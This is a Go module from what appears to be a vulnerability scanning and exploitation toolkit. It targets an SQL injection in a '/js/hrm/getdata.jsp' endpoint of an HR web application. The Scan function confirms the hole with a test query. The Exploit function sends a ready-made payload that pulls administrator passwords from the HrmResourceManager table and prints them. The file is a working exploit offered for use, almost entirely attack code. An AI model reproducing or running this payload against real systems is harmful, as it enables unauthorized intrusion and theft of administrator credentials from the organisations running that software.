package vulners

import (
	"github.com/fatih/color"
	"strings"
)

type Wc03 struct {
}

func (s *Wc03) Scan(targetUrl string) {
	vulnerable, err := Wc03scancore(targetUrl)
	if err != nil {
		color.Red("[x]请求异常！")
		return
	}
	if vulnerable {
		color.Green("[Wc03] 存在getdata SQL注入")
	} else {
		color.White("[Wc03] 不存在getdata SQL注入")
	}
}

func (*Wc03) Exploit(targetUrl string) {
	runResult, err := Wc03runcore(targetUrl)
	if err != nil {
		color.Red("[x]漏洞利用异常！")
		return
	}
	if runResult != "" {
		color.Green(runResult)
	} else {
		color.White("[!]漏洞利用无返回结果")
	}
}

func Wc03scancore(targetUrl string) (bool, error) {
	url := "/js/hrm/getdata.jsp?cmd=getSelectAllId&sql=select+666+id"
	resp, err := baseClient.NewRequest().SetHeader("Content-Type", "application/x-www-form-urlencoded").Get(targetUrl + url)
	if err != nil {
		return false, err
	}
	resContent := resp.String()
	if strings.Contains(resContent, "666") {
		return true, nil
	} else {
		return false, nil
	}
}

func Wc03runcore(targetUrl string) (string, error) {
	url := "/js/hrm/getdata.jsp?cmd=getSelectAllId&sql=select%20password%20as%20id%20from%20HrmResourceManager"
	resp, err := baseClient.NewRequest().SetHeader("Content-Type", "application/x-www-form-urlencoded").Get(targetUrl + url)
	if err != nil {
		return "", err
	}
	resContent := resp.String()
	resContent = strings.Replace(resContent, "\n", "", -1)
	if resContent != "" {
		return "存在getdata SQL注入\n" + "password:\n" + resContent, nil
	} else {
		return "", nil
	}
}
